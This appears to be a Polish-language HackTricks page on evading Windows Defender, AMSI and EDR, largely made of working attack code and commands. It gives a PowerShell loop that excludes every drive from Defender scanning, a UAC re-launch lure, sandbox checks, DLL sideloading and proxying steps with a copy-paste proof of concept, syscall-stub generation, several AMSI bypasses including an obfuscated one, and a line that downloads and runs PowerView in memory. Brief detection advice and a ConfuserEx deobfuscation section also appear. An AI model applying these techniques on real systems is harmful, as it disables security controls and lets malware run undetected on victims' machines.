# Omijanie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została pierwotnie napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymywania działania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymywania działania Windows Defendera przez podszywanie się pod inny program antywirusowy.
- [Wyłącz Defendera, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulacją Defenderem

Publiczne loadery podszywające się pod cheaty do gier często są dostarczane jako niepodpisane instalatory Node.js/Nexe, które najpierw **proszą użytkownika o podniesienie uprawnień**, a dopiero potem unieszkodliwiają Defendera. Przebieg jest prosty:

1. Sprawdź, czy proces działa z uprawnieniami administratora, używając `net session`. Polecenie powiedzie się tylko wtedy, gdy wywołujący ma uprawnienia administratora, więc niepowodzenie oznacza, że loader działa jako zwykły użytkownik.
2. Natychmiast uruchom ponownie sam siebie z czasownikiem `RunAs`, aby wywołać oczekiwany monit UAC o zgodę, zachowując oryginalny wiersz poleceń.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Ofiary już wierzą, że instalują „crackowane” oprogramowanie, więc zwykle akceptują monit, przyznając malware uprawnienia potrzebne do zmiany zasad Defendera.<sup>[[26]](#references)</sup>

### Wykluczenia `MpPreference` dla każdej litery dysku

Po uzyskaniu podwyższonych uprawnień łańcuchy w stylu GachiLoadera maksymalizują luki w ochronie Defendera, zamiast całkowicie wyłączać usługę. Loader najpierw zabija proces nadzorujący GUI (`taskkill /F /IM SecHealthUI.exe`), a następnie dodaje **wyjątkowo szerokie wykluczenia**, dzięki którym profile wszystkich użytkowników, katalogi systemowe i dyski wymienne stają się niemożliwe do przeskanowania:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Pętla przechodzi przez każdy zamontowany system plików (D:\, E:\, pamięci USB itd.), więc **każdy przyszły payload umieszczony gdziekolwiek na dysku zostanie zignorowany**.
- Wykluczenie rozszerzenia `.sys` jest zabezpieczeniem na przyszłość — atakujący zachowują możliwość późniejszego ładowania niepodpisanych sterowników bez ponownej ingerencji w Defendera.
- Wszystkie zmiany trafiają do `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, dzięki czemu kolejne etapy mogą sprawdzić, czy wykluczenia nadal obowiązują, lub rozszerzyć je bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie zostaje zatrzymana, naiwne kontrole stanu nadal informują, że „antywirus jest aktywny”, mimo że inspekcja w czasie rzeczywistym nie obejmuje tych ścieżek.<sup>[[26]](#references)</sup>

## **Metodyka AV Evasion**

Obecnie programy antywirusowe wykorzystują różne metody sprawdzania, czy plik jest złośliwy: wykrywanie statyczne, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR-ów — analizę behawioralną.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych ciągów lub sekwencji bajtów w pliku binarnym lub skrypcie, a także na wyodrębnianiu informacji z samego pliku (np. opisu pliku, nazwy firmy, podpisów cyfrowych, ikony, sumy kontrolnej itp.). Oznacza to, że korzystanie ze znanych publicznych narzędzi może ułatwić wykrycie, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, program antywirusowy nie będzie w stanie go wykryć, ale będziesz potrzebować loadera, który odszyfruje i uruchomi program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić niektóre ciągi w pliku binarnym lub skrypcie, aby ominąć program antywirusowy, ale w zależności od tego, co chcesz poddać obfuskacji, może to być czasochłonne.

- **Własne narzędzia**

Jeśli opracujesz własne narzędzia, nie będą istnieć znane złośliwe sygnatury, ale wymaga to dużo czasu i wysiłku.

> [!TIP]
> Dobrym narzędziem do sprawdzania, czy Windows Defender wykryje plik statycznie, jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli ono plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich osobno. Dzięki temu może wskazać dokładnie, które ciągi lub bajty w pliku binarnym zostały oznaczone.

Gorąco polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) poświęconą praktycznemu AV Evasion.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchamianiu pliku binarnego w sandboxie przez program antywirusowy i obserwowaniu jego złośliwej aktywności (np. prób odszyfrowania i odczytania haseł z przeglądarki, wykonania minidumpa LSASS itp.). Obejście tego mechanizmu może być nieco trudniejsze, ale oto kilka sposobów na uniknięcie sandboxów.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na obejście analizy dynamicznej programu antywirusowego. Programy antywirusowe mają bardzo mało czasu na skanowanie plików, aby nie zakłócać pracy użytkownika, więc długie uśpienie może utrudnić analizę plików binarnych. Problem polega na tym, że wiele sandboxów programów antywirusowych może po prostu pominąć uśpienie — zależnie od jego implementacji.
- **Sprawdzanie zasobów komputera** Sandboxy zwykle dysponują bardzo ograniczonymi zasobami (np. < 2 GB RAM), ponieważ w przeciwnym razie mogłyby spowalniać komputer użytkownika. Możesz też wykazać się kreatywnością, na przykład sprawdzając temperaturę CPU, a nawet prędkość obrotową wentylatorów — nie wszystko zostanie zaimplementowane w sandboxie.
- **Sprawdzanie parametrów konkretnego komputera** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny „contoso.local”, możesz sprawdzić domenę komputera i porównać ją z określoną przez siebie wartością. Jeśli się nie zgadza, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defendera to HAL9TH. Możesz więc przed detonacją sprawdzić nazwę komputera w swoim malware. Jeśli nazwa to HAL9TH, oznacza to, że jesteś w sandboxie Defendera, więc możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących unikania sandboxów

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy w tym wpisie, **publiczne narzędzia** w końcu **zostaną wykryte**, więc warto zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? A może możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS?

Prawdopodobnie lepszym rozwiązaniem jest to drugie. Weźmy mimikatz jako przykład: to prawdopodobnie jeden z najczęściej oznaczanych przez programy antywirusowe i EDR-y elementów malware, a być może nawet najczęściej oznaczany. Sam projekt jest świetny, ale jego używanie w celu obejścia programów antywirusowych to koszmar, więc poszukaj alternatyw, które pozwolą osiągnąć zamierzony cel.

> [!TIP]
> Modyfikując payloady w celu uniknięcia wykrycia, pamiętaj, aby **wyłączyć automatyczne przesyłanie próbek** w Defenderze i, proszę, naprawdę **NIE PRZESYŁAJ PLIKÓW DO VIRUSTOTAL**, jeśli chcesz na dłuższą metę unikać wykrycia. Jeśli chcesz sprawdzić, czy dany program antywirusowy wykryje twój payload, zainstaluj go na maszynie wirtualnej, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż uzyskasz zadowalający wynik.

## EXE a DLL

Jeśli to możliwe, zawsze **preferuj używanie DLL-i w celu uniknięcia wykrycia**. Z mojego doświadczenia wynika, że pliki DLL są zwykle **znacznie rzadziej wykrywane i analizowane**, więc w niektórych przypadkach to bardzo prosta sztuczka pozwalająca uniknąć wykrycia (oczywiście, jeśli twój payload można uruchomić jako DLL).

Jak widać na tym obrazie, payload DLL z Havoc ma wskaźnik wykrywalności 4/26 w antiscan.me, podczas gdy payload EXE ma wskaźnik wykrywalności 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Porównanie w antiscan.me zwykłego payloadu EXE z Havoc ze zwykłą DLL z Havoc</p></figcaption></figure>

Teraz pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby działać znacznie bardziej skrycie.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL stosowaną przez loader, umieszczając aplikację ofiary i złośliwe payloady obok siebie.

Programy podatne na DLL Sideloading możesz znaleźć za pomocą [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

To polecenie wyświetli listę programów podatnych na DLL hijacking w katalogu „C:\Program Files\\” oraz pliki DLL, które próbują załadować.

Gorąco polecam **samodzielnie wyszukiwać programy podatne na DLL Hijack/Sideload**. Ta technika jest dość stealth, jeśli zostanie prawidłowo zastosowana, ale korzystając z publicznie znanych programów podatnych na DLL Sideload, możesz łatwo zostać wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, której oczekuje program, nie spowoduje załadowania payloadu, ponieważ program oczekuje, że biblioteka DLL będzie zawierać określone funkcje. Aby rozwiązać ten problem, użyjemy innej techniki o nazwie **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania wykonywane przez program z biblioteki proxy (i złośliwej) DLL do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając wykonanie payloadu.

Użyję projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik)

Oto kroki, które wykonałem:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL o zmienionej nazwie.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) oraz proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Można to uznać za sukces.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Zdecydowanie polecam** obejrzeć [VOD z transmisji S3cur3Th1sSh1t na Twitchu](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz [film ippseca](https://www.youtube.com/watch?v=3eROsG_WNpE), aby lepiej poznać omawiane zagadnienia.

### Wykorzystywanie przekazywanych eksportów (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości „forwarderami”: zamiast wskazywać kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows:

- Ładuje `TargetDll`, jeśli nie jest jeszcze załadowany
- Rozwiązuje `TargetFunc` z tego modułu

Ważne zachowania:
- Jeśli `TargetDll` jest KnownDLL, jest pobierany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Jeśli `TargetDll` nie jest KnownDLL, używana jest standardowa kolejność wyszukiwania DLL, obejmująca katalog modułu, który rozwiązuje przekazanie.

Umożliwia to pośredni mechanizm sideloadingu: znajdź podpisaną DLL, która eksportuje funkcję przekazywaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść tę podpisaną DLL obok kontrolowanej przez atakującego DLL o dokładnie takiej samej nazwie jak przekazywany moduł docelowy. Gdy zostanie wywołany przekazywany eksport, loader rozwiąże przekazanie i załaduje DLL z tego samego katalogu, wykonując jej DllMain.<sup>[[13]](#references)</sup>

Przykład zaobserwowany w Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nie jest KnownDLL, więc jest wyszukiwana zgodnie ze standardową kolejnością wyszukiwania.

PoC (kopiuj-wklej):
1) Skopiuj podpisaną systemową bibliotekę DLL do folderu z prawem zapisu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Umieść złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Minimalna funkcja DllMain wystarczy do wykonania kodu; nie musisz implementować przekazywanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Uruchom przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Zaobserwowane zachowanie:
- rundll32 (podpisany) ładuje side-by-side `keyiso.dll` (podpisany)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, błąd „missing API” pojawi się dopiero po wykonaniu `DllMain`

Wskazówki dotyczące wyszukiwania:
- Skup się na przekierowanych eksportach, których moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione w `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyliczyć przekierowane eksporty za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz spis forwarderów w Windows 11, aby wyszukać potencjalnych kandydatów: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL-e ze ścieżek spoza katalogów systemowych, a następnie ładujące z tego katalogu pliki nieznajdujące się na liście KnownDLLs, o tej samej nazwie bazowej
- Generuj alerty dla łańcuchów procesów/modułów, takich jak: `rundll32.exe` → `keyiso.dll` spoza katalogów systemowych → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj stosowanie zasad integralności kodu (WDAC/AppLocker) i zabraniaj jednoczesnego zapisu i wykonywania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi payload do omijania EDR-ów za pomocą zawieszonych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonywania`

Możesz użyć Freeze, aby w ukryty sposób załadować i wykonać swój shellcode.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kotka i myszkę — to, co działa dzisiaj, jutro może zostać wykryte, dlatego nigdy nie polegaj tylko na jednym narzędziu. Jeśli to możliwe, łącz ze sobą różne techniki evasion.

## Direct/Indirect Syscalls i ustalanie SSN (SysWhispers4)

EDR-y często umieszczają **inline hooks w trybie użytkownika** na stubach syscall w `ntdll.dll`. Aby ominąć te hooki, możesz wygenerować stuby syscall **direct** lub **indirect**, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania zahookowanego punktu wejścia eksportu.<sup>[[32]](#references)</sup>

**Opcje wywołania:**
- **Direct (embedded)**: umieszcza w wygenerowanym stubie instrukcję `syscall`/`sysenter`/`SVC #0` (bez wywołania eksportu `ntdll`).
- **Indirect**: skacze do istniejącego gadżetu `syscall` w `ntdll`, dzięki czemu przejście do jądra wygląda, jakby pochodziło z `ntdll` (przydatne do omijania heurystyk); **randomized indirect** wybiera gadżet z puli przy każdym wywołaniu.
- **Egg-hunt**: pozwala uniknąć umieszczania na dysku statycznej sekwencji opcode `0F 05`; wyszukuje sekwencję syscall w czasie działania.

**Odporne na hooki strategie ustalania SSN:**
- **FreshyCalls (VA sort)**: określa SSN przez sortowanie stubów syscall według adresu wirtualnego zamiast odczytywania bajtów stubów.
- **SyscallsFromDisk**: mapuje czystą kopię `\KnownDlls\ntdll.dll`, odczytuje SSN z jej sekcji `.text`, a następnie ją odmapowuje (omija wszystkie hooki w pamięci).
- **RecycledGate**: łączy ustalanie SSN przez sortowanie VA z walidacją opcode, gdy stub jest czysty; jeśli jest zahookowany, przechodzi na ustalanie SSN przez VA.
- **HW Breakpoint**: ustawia DR0 na instrukcji `syscall` i używa VEH do przechwycenia SSN z `EAX` w czasie działania, bez analizowania zahookowanych bajtów.

Przykładowe użycie SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI stworzono, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo programy antywirusowe potrafiły skanować tylko **pliki na dysku**, więc jeśli udało się uruchomić payloady **bezpośrednio w pamięci**, program antywirusowy nie mógł temu zapobiec, ponieważ nie miał wystarczającego wglądu.

Funkcja AMSI jest zintegrowana z następującymi składnikami systemu Windows:

- Kontrola konta użytkownika (UAC; podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra VBA pakietu Office

Umożliwia rozwiązaniom antywirusowym analizowanie zachowania skryptów, udostępniając ich zawartość w postaci niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wywoła następujący alert w programie Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że na początku dodaje `amsi:`, a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe.

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci przez AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# również jest skanowany przez AMSI. Dotyczy to nawet użycia `Assembly.Load(byte[])` do ładowania kodu w celu wykonania go w pamięci. Dlatego w przypadku wykonywania kodu w pamięci zaleca się użycie starszych wersji .NET (na przykład 4.7.2 lub niższej), jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI opiera się głównie na wykrywaniu statycznym, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

AMSI potrafi jednak deobfuskować skrypty, nawet jeśli mają wiele warstw obfuskacji, więc w zależności od sposobu wykonania obfuskacja może być złym rozwiązaniem. Przez to uniknięcie wykrycia nie jest takie proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych, aby uniknąć wykrycia — zależy to od tego, w jakim stopniu dana treść została oflagowana.

- **AMSI Bypass**

Ponieważ AMSI działa poprzez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itp.), można łatwo manipulować tym modułem nawet jako nieuprzywilejowany użytkownik. Ze względu na tę wadę implementacji AMSI badacze znaleźli wiele sposobów na uniknięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) sprawi, że w bieżącym procesie nie zostanie uruchomione skanowanie. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu wykorzystaniu tej metody.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Wystarczył jeden wiersz kodu PowerShell, aby uniemożliwić działanie AMSI w bieżącym procesie PowerShell. Oczywiście sam AMSI wykrywał ten wiersz, więc aby zastosować tę technikę, trzeba go zmodyfikować.

Oto zmodyfikowany bypass AMSI z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Pamiętaj, że ten post prawdopodobnie zostanie oflagowany po publikacji, więc jeśli chcesz pozostać niewykryty, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została po raz pierwszy odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji „AmsiScanBuffer” w amsi.dll (odpowiedzialnej za skanowanie danych wejściowych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. Dzięki temu wynik właściwego skanowania wynosi 0, co jest interpretowane jako czysty wynik.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/), aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik omijania AMSI w powershell. Więcej informacji znajdziesz na [**tej stronie**](basic-powershell-for-pentesters/index.html#amsi-bypass) i w [**tym repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### Blokowanie AMSI przez uniemożliwienie załadowania amsi.dll (hook LdrLoadDll)

AMSI jest inicjalizowane dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidne obejście niezależne od języka polega na założeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje, a proces nie wykonuje żadnych skanowań.<sup>[[23]](#references)</sup>

Zarys implementacji (pseudokod x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa z PowerShell, WScript/CScript i niestandardowymi loaderami (czyli wszystkim, co w innym przypadku ładowałoby AMSI).
- Połącz z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich śladów w wierszu poleceń.
- Stosowane w loaderach uruchamianych przez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** również generuje skrypt omijający AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt omijający AMSI i unikający sygnatur dzięki losowo generowanym funkcjom zdefiniowanym przez użytkownika, zmiennym i wyrażeniom znakowym oraz losowej zmianie wielkości liter w słowach kluczowych PowerShell.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane w systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby ominąć logowanie PowerShell, możesz użyć następujących technik:

- **Wyłącz Transcription i Module Logging w PowerShell**: Możesz w tym celu użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Użyj PowerShell w wersji 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania ich przez AMSI. Możesz to zrobić tak: `powershell.exe -version 2`
- **Użyj niezarządzanej sesji PowerShell**: Użyj [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), aby hostować PowerShell bez uruchamiania `powershell.exe` (takie podejście stosuje `powerpick` w Cobalt Strike). Pozwala to ominąć mechanizmy kontroli powiązane konkretnie z procesem `powershell.exe`, ale samo w sobie nie wyłącza AMSI, Script Block Logging ani wszystkich innych zabezpieczeń PowerShell; zakres ochrony zależy od środowiska uruchomieniowego i implementacji hosta.


## Obfuscation

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego, ułatwiając jego wykrycie przez AV i EDR. Zachowaj ostrożność i rozważ szyfrowanie tylko określonych fragmentów kodu, które są wrażliwe lub muszą zostać ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware korzystającego z ConfuserEx 2 (lub komercyjnych forków) często napotkasz kilka warstw zabezpieczeń, które blokują dekompilatory i sandboxy. Poniższy proces niezawodnie **przywraca kod IL zbliżony do oryginalnego**, który następnie można zdekompilować do C# za pomocą narzędzi takich jak dnSpy lub ILSpy.<sup>[[10]](#references)</sup>

1.  Usunięcie zabezpieczenia przed modyfikacją – ConfuserEx szyfruje każde *ciało metody* i odszyfrowuje je w statycznym konstruktorze *modułu* (`<Module>.cctor`). Dodatkowo modyfikuje sumę kontrolną PE, przez co każda zmiana powoduje awarię pliku binarnego. Użyj **AntiTamperKiller**, aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać oczyszczone assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Wynik zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy tworzeniu własnego unpackera.

2.  Odzyskiwanie symboli / przepływu sterowania – przekaż *czysty* plik do **de4dot-cex** (forka de4dot obsługującego ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flagi:
     • `-p crx` – wybierz profil ConfuserEx 2
